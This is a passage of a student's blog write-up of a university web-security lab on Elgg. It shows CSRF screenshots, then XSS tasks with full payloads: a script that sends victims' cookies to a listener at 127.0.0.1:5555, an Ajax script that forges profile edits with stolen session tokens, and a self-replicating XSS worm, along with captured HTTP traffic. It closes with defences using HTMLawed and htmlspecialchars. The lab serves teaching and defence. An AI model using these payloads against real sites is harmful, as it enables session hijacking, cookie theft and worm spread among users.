+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232609700.png"
+alt="image-20240620232609700" />
+<figcaption aria-hidden="true">image-20240620232609700</figcaption>
+</figure>
+<p>GET request has no token:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232620176.png"
+alt="image-20240620232620176" />
+<figcaption aria-hidden="true">image-20240620232620176</figcaption>
+</figure>
+<p>POST request has no token:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232830171.png"
+alt="image-20240620232830171" />
+<figcaption aria-hidden="true">image-20240620232830171</figcaption>
+</figure>
+<p>Login has no token:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240620232359807.png"
+alt="image-20240620232359807" />
+<figcaption aria-hidden="true">image-20240620232359807</figcaption>
+</figure>
+<h2 id="cross-site-scripting-xss-attack-experiment"><strong>Cross-Site
+Scripting (XSS) Attack Experiment</strong></h2>
+<p>First need to switch websites, switch to
+http://www.xsslabelgg.com.</p>
+<h3 id="task-1-steal-cookie-from-victims-machine"><strong>Task 1: Steal
+Cookie from Victim’s Machine</strong></h3>
+<p>Use samy to log in, modify samy’s profile. In the About me field,
+first click Edit HTML, add the following content:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=http://127.0.0.1:5555?c=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) +  <span class="string">&#x27;&gt;&#x27;</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102354596.png"
+alt="image-20240621102354596" />
+<figcaption aria-hidden="true">image-20240621102354596</figcaption>
+</figure>
+<p>Switch to Alice and view Samy’s homepage, use nc to listen on port
+5555 <code>nc -l 5555 -v</code> to view packet information, HTTP Header
+Live also works.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621102835358.png"
+alt="image-20240621102835358" />
+<figcaption aria-hidden="true">image-20240621102835358</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621103053599.png"
+alt="image-20240621103053599" />
+<figcaption aria-hidden="true">image-20240621103053599</figcaption>
+</figure>
+<h3
+id="task-2-use-ajax-script-to-automatically-initiate-session-hijacking"><strong>Task
+2: Use Ajax Script to Automatically Initiate Session
+Hijacking</strong></h3>
+<p>Use samy to log in, modify samy’s profile. In the About me field,
+first click Edit HTML, add the following content:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>Then, switch to using Alice to log in, open Samy’s homepage from
+Alice’s interface to view. Through the HTTP Header Live plugin, it was
+found that a POST request to modify brief description has been sent out,
+achieving the attack effect. The sent HTTP packet:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621104726870.png"
+alt="image-20240621104726870" />
+<figcaption aria-hidden="true">image-20240621104726870</figcaption>
+</figure>
+<h3 id="task-3-construct-xss-worm"><strong>Task 3: Construct XSS
+Worm</strong></h3>
+<p>Use samy to log in, modify samy’s profile. In the About me field,
+first click Edit HTML, add the following content:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&#x27;worm&#x27;</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ts = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> guid = elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;</span>, &#123;  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">headers</span>: &#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;,  </span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_ts</span>: ts,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">__elgg_token</span>: token,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">guid</span>: guid,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">briefdescription</span>: <span class="string">&quot;Samy is my hero&quot;</span>,  </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">description</span>: <span class="string">&quot;&lt;script id=&#x27;worm&#x27;&gt;&quot;</span> + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;worm&#x27;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;\/script&gt;&quot;</span>  </span></span><br><span class="line"><span class="language-javascript">            &#125;)  </span></span><br><span class="line"><span class="language-javascript">        &#125;)  </span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">3000</span>)  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>Then, switch to using Alice to log in, open Samy’s homepage from
+Alice’s interface to view. Through the HTTP Header Live plugin, it was
+found that a POST request to modify brief description has been sent out,
+achieving the attack effect. The sent HTTP packet:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621105412187.png"
+alt="image-20240621105412187" />
+<figcaption aria-hidden="true">image-20240621105412187</figcaption>
+</figure>
+<p>Unlike the above, the description field of this POST packet was
+modified to the malicious XSS script itself, thus creating
+propagability. The specific content of the packet modifying Alice’s
+Profile is as follows.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621110705476.png"
+alt="image-20240621110705476" />
+<figcaption aria-hidden="true">image-20240621110705476</figcaption>
+</figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">http://www.xsslabelgg.com/action/profile/edit</span><br><span class="line">Host: www.xsslabelgg.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.xsslabelgg.com/profile/samy</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">origin: http://www.xsslabelgg.com</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Cookie: Elgg=jl5l97kq1k4todunjgn0ek8ft0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">__elgg_ts=1718938378&amp;__elgg_token=P-0B7cbe_msL5vOGF0n8AQ&amp;guid=44&amp;briefdescription=Samy is my hero&amp;description=&lt;script id=&#x27;worm&#x27;&gt;  </span><br><span class="line">    setTimeout(() =&gt; &#123;  </span><br><span class="line">        var ts = elgg.security.token.__elgg_ts;  </span><br><span class="line">        var token = elgg.security.token.__elgg_token;  </span><br><span class="line">        var guid = elgg.session.user.guid;  </span><br><span class="line">        fetch(&#x27;http://www.xsslabelgg.com/action/profile/edit&#x27;, &#123;  </span><br><span class="line">            credentials: &#x27;include&#x27;,  </span><br><span class="line">            method: &#x27;POST&#x27;,  </span><br><span class="line">            headers: &#123;  </span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            body: new URLSearchParams(&#123;  </span><br><span class="line">                __elgg_ts: ts,  </span><br><span class="line">                __elgg_token: token,  </span><br><span class="line">                guid: guid,  </span><br><span class="line">                briefdescription: &quot;Samy is my hero&quot;,  </span><br><span class="line">                description: &quot;&lt;script id=&#x27;worm&#x27;&gt;&quot; + document.getElementById(&#x27;worm&#x27;).innerHTML + &quot;&lt;\/script&gt;&quot;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;, 3000)  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">POST: HTTP/1.1 302 Found</span><br><span class="line">Date: Fri, 21 Jun 2024 02:53:01 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Location: http://www.xsslabelgg.com/profile/alice</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=5, max=97</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br></pre></td></tr></table></figure>
+<p>Log in as Boby and access Alice’s profile, can also get the POST
+packet modifying the profile and Boby’s introduction was also modified
+to the same sentence:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111233972.png"
+alt="image-20240621111233972" />
+<figcaption aria-hidden="true">image-20240621111233972</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621111431159.png"
+alt="image-20240621111431159" />
+<figcaption aria-hidden="true">image-20240621111431159</figcaption>
+</figure>
+<h3 id="task-4-defense-strategy-1"><strong>Task 4: Defense
+Strategy</strong></h3>
+<h4 id="only-enable-htmlawed-1.9">Only Enable HTMLawed 1.9</h4>
+Elgg has default defense strategies. The virtual machine has disabled
+and commented out the corresponding defense strategies. In fact, the
+Elgg web application originally enables a customized security plugin
+HTMLawed, which validates user input and removes tags from the input.
+This specific plugin is registered to the filter tags function in the
+elgg/engine/lib/input.php file. For example, it converts tags like
+<script>
+to
+<p>
+<p>so that JavaScript scripts cannot be executed.</p>
+<p>Go to Account→administration (top menu)→plugins (on the right panel),
+then select security and spam from the dropdown menu and click filter.
+Find the HTMLawed 1.8 plugin below. Click Activate to enable the
+strategy.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120050952.png"
+alt="image-20240621120050952" />
+<figcaption aria-hidden="true">image-20240621120050952</figcaption>
+</figure>
+<p>Visit Samy’s homepage again and try to modify, found that script tags
+were converted to p tags, the inserted js statement format was converted
+and cannot be executed.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621120305885.png"
+alt="image-20240621120305885" />
+<figcaption aria-hidden="true">image-20240621120305885</figcaption>
+</figure>
+<h4 id="enable-htmlawed-1.9-and-htmlspecialchars">Enable HTMLawed 1.9
+and htmlspecialchars</h4>
+<p>The <code>htmlspecialchars</code> function converts the following
+special characters to corresponding HTML entities:</p>
+<ul>
+<li><code>&amp;</code> converts to &amp;amp;</li>
+<li><code>&lt;</code> converts to &amp;lt;</li>
+<li><code>&gt;</code> converts to &amp;gt;</li>
+<li><code>"</code> converts to &amp;quot;</li>
+<li><code>'</code> converts to &amp;#039;</li>
+</ul>
+<p>We enter the directory
+<code>/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</code> as
+superuser in the virtual machine, use vim to enter the files that call
+the <code>htmlspecialchars()</code> function: text.php, url.php,
+dropdown.php, email.php. In each file, uncomment the corresponding
+<code>htmlspecialchars()</code> function call. The commands used are as
+follows:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo su </span><br><span class="line">cd /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/</span><br><span class="line">vim text.php </span><br><span class="line">vim url.php </span><br><span class="line">vim dropdown.php </span><br><span class="line">vim email.php </span><br></pre></td></tr></table></figure>
+<p>text.php:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121244426.png"
+alt="image-20240621121244426" />
+<figcaption aria-hidden="true">image-20240621121244426</figcaption>
+</figure>
+<p>url.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121416527.png"
+alt="image-20240621121416527" />
+<figcaption aria-hidden="true">image-20240621121416527</figcaption>
+</figure>
+<p>dropdown.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121450425.png"
+alt="image-20240621121450425" />
+<figcaption aria-hidden="true">image-20240621121450425</figcaption>
+</figure>
+<p>email.php</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621121538048.png"
+alt="image-20240621121538048" />
+<figcaption aria-hidden="true">image-20240621121538048</figcaption>
+</figure>
+<p>Visit Samy’s homepage, found that some special symbols have been
+converted to entity symbols, js statements cannot be executed:</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621123332775.png"
+alt="image-20240621123332775" />
+<figcaption aria-hidden="true">image-20240621123332775</figcaption>
+</figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io">Xiang Li</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/">https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Course-Experiments/">Course Experiments</a></div><div class="post-share"><div class="social-share" data-image="https://pic1.zhimg.com/80/v2-416f1b8d4133d67e746a67adbb40f508_720w.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/02/Deep-Learning/CNN_P1/" title="CNNs - Part 1"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002142654568.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">CNNs - Part 1</div></div><div class="info-2"><div class="info-item-1">Notes on Convolutional Neural Networks (CNN)</div></div></div></a><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/" title="HUST Information System Security Lab2-System Security"><img class="cover" src="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HUST Information System Security Lab2-System Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab2</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab1-Software%20Security/" title="HUST Information System Security Lab1-Software Security"><img class="cover" src="https://t3.chei.com.cn/zyk/zybk/zyjd/cdn/showImg/ikb2ll7ejr4ufkfj.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab1-Software Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab1</div></div></div></a><a class="pagination-related" href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/" title="HUST Information System Security Lab2-System Security"><img class="cover" src="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="info-item-2">HUST Information System Security Lab2-System Security</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Information System Security Lab2</div></div></div></a><a class="pagination-related" href="/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/" title="HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/v2osk-1Z2niiBPg5A-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-29</div><div class="info-item-2">HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab2</div></div></div></a><a class="pagination-related" href="/2023/12/05/HUST-Labs/HUST%20Operating%20System%20Lab3:%20Memory%20Management/" title="HUST Operating System Lab3: Memory Management"><img class="cover" src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/david-marcu-78A265wPiO4-unsplash.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="info-item-2">HUST Operating System Lab3: Memory Management</div></div><div class="info-2"><div class="info-item-1">Operation process record for HUST Operating System Lab3</div></div></div></a><a class="pagination-related" href="/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/" title="11711 Advanced NLP: Architectures"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-29</div><div class="info-item-2">11711 Advanced NLP: Architectures</div></div><div class="info-2"><div class="info-item-1">Notes on RNN architectures, encoder-decoder models, and attention mechanisms from CMU 11-711 Advanced NLP.</div></div></div></a><a class="pagination-related" href="/2026/01/23/11711-Advanced-NLP/11711-Advanced-NLP-Fundamentals/" title="11711 Advanced NLP: Fundamentals"><img class="cover" src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-22</div><div class="info-item-2">11711 Advanced NLP: Fundamentals</div></div><div class="info-2"><div class="info-item-1">Notes and summaries for CMU 11-711 Advanced NLP.</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Xiang Li</div><div class="author-info-description">Xiang Li's Blog</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XLOverflow"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Talk is cheap. Show me the code.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#information-system-security-lab3-record"><span class="toc-number">1.</span> <span class="toc-text">Information System
+Security Lab3 Record</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-csrf-attack-experiment"><span class="toc-number">1.1.</span> <span class="toc-text">Cross-Site
+Request Forgery (CSRF) Attack Experiment</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task-1-csrf-attack-based-on-get-request"><span class="toc-number">1.1.1.</span> <span class="toc-text">Task 1: CSRF
+Attack Based on GET Request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-2-csrf-attack-using-post-request"><span class="toc-number">1.1.2.</span> <span class="toc-text">Task 2: CSRF
+Attack Using POST Request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-3-implement-login-csrf-attack"><span class="toc-number">1.1.3.</span> <span class="toc-text">Task 3: Implement
+Login CSRF Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-4-defense-strategy"><span class="toc-number">1.1.4.</span> <span class="toc-text">Task 4: Defense
+Strategy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-scripting-xss-attack-experiment"><span class="toc-number">1.2.</span> <span class="toc-text">Cross-Site
+Scripting (XSS) Attack Experiment</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task-1-steal-cookie-from-victims-machine"><span class="toc-number">1.2.1.</span> <span class="toc-text">Task 1: Steal
+Cookie from Victim’s Machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-2-use-ajax-script-to-automatically-initiate-session-hijacking"><span class="toc-number">1.2.2.</span> <span class="toc-text">Task
+2: Use Ajax Script to Automatically Initiate Session
+Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-3-construct-xss-worm"><span class="toc-number">1.2.3.</span> <span class="toc-text">Task 3: Construct XSS
+Worm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task-4-defense-strategy-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">Task 4: Defense
+Strategy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#only-enable-htmlawed-1.9"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">Only Enable HTMLawed 1.9</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11711 Advanced NLP: Retrieval and RAG"/></a><div class="content"><a class="title" href="/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG">11711 Advanced NLP: Retrieval and RAG</a><time datetime="2026-02-14T22:08:21.000Z" title="Created 2026-02-14 17:08:21">2026-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/" title="15642 Machine Learning Systems: Distributed Training and Parallelization"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260122210733236.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="15642 Machine Learning Systems: Distributed Training and Parallelization"/></a><div class="content"><a class="title" href="/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/" title="15642 Machine Learning Systems: Distributed Training and Parallelization">15642 Machine Learning Systems: Distributed Training and Parallelization</a><time datetime="2026-02-13T21:00:00.000Z" title="Created 2026-02-13 16:00:00">2026-02-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM Sys: Decoding"><img 